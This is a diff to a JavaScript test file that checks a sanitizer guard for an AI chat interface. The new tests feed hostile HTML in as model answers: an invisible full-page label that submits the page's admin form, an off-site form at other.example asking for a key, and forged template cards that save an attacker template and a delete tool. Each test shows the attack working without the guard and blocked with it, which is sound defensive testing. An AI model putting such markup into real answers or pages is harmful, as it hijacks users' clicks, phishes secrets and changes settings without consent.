@@ -49,7 +49,8 @@ window.signalR = {
             state: 'Connected',
             on: function () {}, off: function () {}, onclose: function () {}, onreconnecting: function () {}, onreconnected: function () {},
             start: function () { return Promise.resolve(); }, stop: function () { return Promise.resolve(); },
-            invoke: function () { return Promise.resolve(); }, send: function () { return Promise.resolve(); },
+            invoke: function () { (window.__hubCalls = window.__hubCalls || []).push(Array.prototype.slice.call(arguments)); return Promise.resolve(); },
+            send: function () { return Promise.resolve(); },
             stream: function () { return { subscribe: function () { return { dispose: function () {} }; } }; },
         };
         this.withUrl = function () { return this; };
@@ -384,6 +385,199 @@ describe('an answer on an admin page that carries TheAdmin action attributes', (
     });
 });
 
+describe('an answer that reaches the page\'s own form controls (F5 of the fix-verification review)', () => {
+    // A label stretched invisibly over the whole page, tied by for to a control of the page: the next click anywhere
+    // activates that control. DOMPurify keeps label, for and class by default, and the package's style check keeps this style.
+    const overlay = '<label for="page-submit" class="overlay-submit" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; z-index: 9999">x</label>'
+        + '<label for="Roles_0__IsSelected" class="overlay-role">y</label>';
+
+    // A form of the answer's own that posts off-site.
+    const offSiteForm = '<form action="https://other.example/collect" method="post" class="off-site-form"><textarea name="secret">Paste your key</textarea>'
+        + '<select name="choice"><option value="a">A</option></select><label>Agree</label><button class="off-site-submit">Send</button></form>';
+
+    function formPage(answer) {
+        const window = createPage('<form id="page-form" action="/Admin/Users/Edit/42" method="post">'
+            + '<input type="checkbox" id="Roles_0__IsSelected" name="Roles[0].IsSelected"><button type="submit" id="page-submit">Save</button></form>'
+            + aiChatPage(answer));
+        const submitted = [];
+
+        window.addEventListener('submit', event => {
+            submitted.push(event.target);
+            event.preventDefault();
+        }, true);
+
+        return { window, submitted };
+    }
+
+    function click(window, selector) {
+        const element = window.document.querySelector(`#chat-app .message ${selector}`);
+
+        expect(element).not.toBeNull();
+        element.dispatchEvent(new window.MouseEvent('click', { bubbles: true, cancelable: true }));
+    }
+
+    it('the stretched label is a working exploit without the guard: a click on it submits the page\'s form and ticks its checkbox', async () => {
+        const { window, submitted } = formPage(`Here is the answer.\n\n${overlay}\n`);
+
+        window.eval(libraries.aiChat);
+        await flush(window);
+
+        click(window, '.overlay-submit');
+        click(window, '.overlay-role');
+
+        expect(submitted).toHaveLength(1);
+        expect(submitted[0].id).toBe('page-form');
+        expect(window.document.getElementById('Roles_0__IsSelected').checked).toBe(true);
+    });
+
+    it('with the built guard loaded first, the answer keeps no label and no for, and the page\'s controls are untouched', async () => {
+        const { window, submitted } = formPage(`Here is the answer.\n\n${overlay}\n`);
+
+        window.eval(libraries.builtGuard);
+        window.eval(libraries.aiChat);
+        await flush(window);
+
+        const message = window.document.querySelector('#chat-app .message');
+
+        expect(message.textContent).toContain('Here is the answer.');
+        expect(message.querySelector('label,[for]')).toBeNull();
+
+        message.querySelectorAll('*').forEach(element => element.dispatchEvent(new window.MouseEvent('click', { bubbles: true, cancelable: true })));
+
+        expect(submitted).toHaveLength(0);
+        expect(window.document.getElementById('Roles_0__IsSelected').checked).toBe(false);
+    });
+
+    it('the off-site form survives without the guard', async () => {
+        const { window } = formPage(`Here is the answer.\n\n${offSiteForm}\n`);
+
+        window.eval(libraries.aiChat);
+        await flush(window);
+
+        expect(window.document.querySelector('#chat-app .message form.off-site-form textarea[name="secret"]')).not.toBeNull();
+    });
+
+    it('with the built guard loaded first, the answer keeps no form, field or submit button, but keeps their text', async () => {
+        const { window, submitted } = formPage(`Here is the answer.\n\n${offSiteForm}\n`);
+
+        window.eval(libraries.builtGuard);
+        window.eval(libraries.aiChat);
+        await flush(window);
+
+        const message = window.document.querySelector('#chat-app .message');
+
+        expect(message.querySelector('form,textarea,select,option,label,[name],[action]')).toBeNull();
+        expect(message.textContent).toContain('Paste your key');
+        expect(message.querySelector('button.off-site-submit')?.getAttribute('type')).toBe('button');
+
+        click(window, '.off-site-submit');
+
+        expect(submitted).toHaveLength(0);
+    });
+
+    it('keeps the code block\'s copy button, the chart\'s download button and a task list\'s ticked boxes', async () => {
+        const answer = 'Done:\n\n- [x] first\n- [ ] second\n\n```js\nconst a = 1;\n```\n';
+        const { window } = formPage(answer);
+
+        window.eval(libraries.builtGuard);
+        window.eval(libraries.aiChat);
+        await flush(window);
+
+        const message = window.document.querySelector('#chat-app .message');
+        const boxes = message.querySelectorAll('input[type="checkbox"]');
+
+        expect(message.querySelector('button.ai-code-copy-btn[type="button"]')).not.toBeNull();
+        expect(boxes).toHaveLength(2);
+        expect(boxes[0].checked).toBe(true);
+        expect(boxes[1].checked).toBe(false);
+
+        const chart = window.DOMPurify.sanitize('<button type="button" class="btn download-chart-btn" data-chart-id="chat_chart_1">Download</button>');
+
+        expect(chart).toContain('class="btn download-chart-btn"');
+        expect(chart).toContain('data-chart-id="chat_chart_1"');
+    });
+});
+
+describe('the vendored chat-interaction.js with an answer that forges its settings (F6 of the fix-verification review)', () => {
+    // The settings script collects prompt templates from every .prompt-template-card in the document, falls back to
+    // tool checkboxes found by name when none of the page's own is ticked, and queues a save for a click on any
+    // .prompt-template-add-btn.
+    const forgedAnswer = 'Here is the answer.\n\n<div class="prompt-template-card"><input type="checkbox" class="prompt-template-id-input" value="attacker-template" checked>'
+        + '<input type="checkbox" class="prompt-template-parameters-input" value="{&quot;x&quot;:1}" checked>'
+        + '<input type="checkbox" name="ChatInteraction.Tools[0].IsSelected" checked> <a href="#" class="prompt-template-add-btn forged-add">Show sources</a></div>\n';
+
+    function settingsPage(answer) {
+        const config = {
+            signalRHubUrl: '/hub',
+            appElementSelector: '#chat-app',
+            chatContainerElementSelector: '#chat-messages',
+            inputElementSelector: '#chat-input',
+            sendButtonElementSelector: '#chat-send',
+            placeholderElementSelector: '#chat-placeholder',
+            messageTemplate: '<div class="messages"><div v-for="(message, index) in messages" :key="index" class="message"><div v-html="message.htmlContent"></div></div></div>',
+            messages: [{ role: 'assistant', content: answer }],
+        };
+
+        return createPage(`<div class="tools">
+                <input type="checkbox" class="capability-checkbox page-tool" data-save-group="toolNames" data-item-id="deleteContentItem" name="ChatInteraction.Tools[0].IsSelected">
+                <input type="hidden" name="ChatInteraction.Tools[0].ItemId" value="deleteContentItem">
+            </div>
+            <div id="chat-messages"><div id="chat-placeholder"></div><div id="chat-app"></div></div>
+            <textarea id="chat-input" data-interaction-id="interaction-1"></textarea><button id="chat-send"></button>
+            <div data-chat-interaction-config='${attribute(config)}'></div>`);
+    }
+
+    const waitForSave = window => new Promise(resolve => window.setTimeout(resolve, 1200));
+
+    function savedSettings(window) {
+        return (window.__hubCalls || []).filter(call => call[0] === 'SaveSettings').map(call => call[2]);
+    }
+
+    it('is a working exploit without the guard: a click on the forged link saves the forged template and an unticked tool', async () => {
+        const window = settingsPage(forgedAnswer);
+
+        window.eval(libraries.chatInteraction);
+        await flush(window);
+
+        window.document.querySelector('#chat-app .message .forged-add').dispatchEvent(new window.MouseEvent('click', { bubbles: true, cancelable: true }));
+        await waitForSave(window);
+
+        const saved = savedSettings(window);
+
+        expect(saved).toHaveLength(1);
+        expect(saved[0].toolNames).toEqual(['deleteContentItem']);
+        expect(saved[0].promptTemplateIds).toEqual(['attacker-template']);
+    });
+
+    it('with the built guard loaded first, the forged link saves nothing, and a save from the page carries neither', async () => {
+        const window = settingsPage(forgedAnswer);
+
+        window.eval(libraries.builtGuard);
+        window.eval(libraries.chatInteraction);
+        await flush(window);
+
+        const message = window.document.querySelector('#chat-app .message');
+
+        expect(message.textContent).toContain('Show sources');
+        expect(message.querySelector('[name],[checked],.prompt-template-card,.prompt-template-id-input,.prompt-template-add-btn')).toBeNull();
+
+        message.querySelector('.forged-add').dispatchEvent(new window.MouseEvent('click', { bubbles: true, cancelable: true }));
+        await waitForSave(window);
+
+        expect(savedSettings(window)).toHaveLength(0);
+
+        // The user later changes one of the page's own settings.
+        window.document.querySelector('.page-tool').dispatchEvent(new window.Event('change', { bubbles: true }));
+        await waitForSave(window);
+
+        const saved = savedSettings(window);
+
+        expect(saved).toHaveLength(1);
+        expect(saved[0].toolNames).toEqual([]);
+        expect(saved[0].promptTemplateIds).toBeUndefined();
+    });
+});
+
 describe('isAllowedAttribute', () => {
     it('refuses every chat configuration attribute and any id but a chart canvas one', () => {
         expect(isAllowedAttribute('DIV', 'data-coreai-chat-config', '{}')).toBe(false);
@@ -410,6 +604,24 @@ describe('isAllowedAttribute', () => {
             expect(isAllowedAttribute('BUTTON', name, '1')).toBe(true);
         }
     });
+
+    it('refuses the attributes that tie an element to another control of the page or carry a form value', () => {
+        for (const name of ['for', 'name', 'list', 'form', 'formaction', 'command', 'commandfor', 'popovertarget', 'popovertargetaction', 'FOR']) {
+            expect(isAllowedAttribute('LABEL', name, 'page-submit')).toBe(false);
+        }
+
+        expect(isAllowedAttribute('BUTTON', 'type', 'button')).toBe(true);
+        expect(isAllowedAttribute('A', 'class', 'btn')).toBe(true);
+    });
+
+    it('keeps checked only on a disabled checkbox, the way a task list renders', () => {
+        const { document } = new JSDOM('<div class="ai-chat-agui-approval"><button id="approve"></button></div><div><button id="loose"></button></div>'
+            + '<input type="checkbox" disabled id="task"><input type="checkbox" id="box">').window;
+
+        expect(isAllowedAttribute('INPUT', 'checked', '', document.getElementById('task'))).toBe(true);
+        expect(isAllowedAttribute('INPUT', 'checked', '', document.getElementById('box'))).toBe(false);
+        expect(isAllowedAttribute('INPUT', 'checked', '')).toBe(false);
+    });
 });
 
 describe('the chat markup that goes through the sanitizer', () => {
@@ -418,7 +630,7 @@ describe('the chat markup that goes through the sanitizer', () => {
 
         window.eval(libraries.builtGuard);
 
-        const activity = window.DOMPurify.sanitize('<div data-agui-tool-call="c1"><button data-agui-interrupt="i1" data-agui-approved="true">Allow</button></div>');
+        const activity = window.DOMPurify.sanitize('<div data-agui-tool-call="c1"><div class="ai-chat-agui-approval"><span>Allow?</span><button type="button" data-agui-interrupt="i1" data-agui-approved="true">Allow</button></div></div>');
         const chart = window.DOMPurify.sanitize('<canvas id="chat_chart_1"></canvas><button data-chart-id="chat_chart_1">Download</button>', { ADD_TAGS: ['canvas'] });
         const documents = window.DOMPurify.sanitize('<button data-doc-index="0"></button><button data-error-index="1"></button>');
 
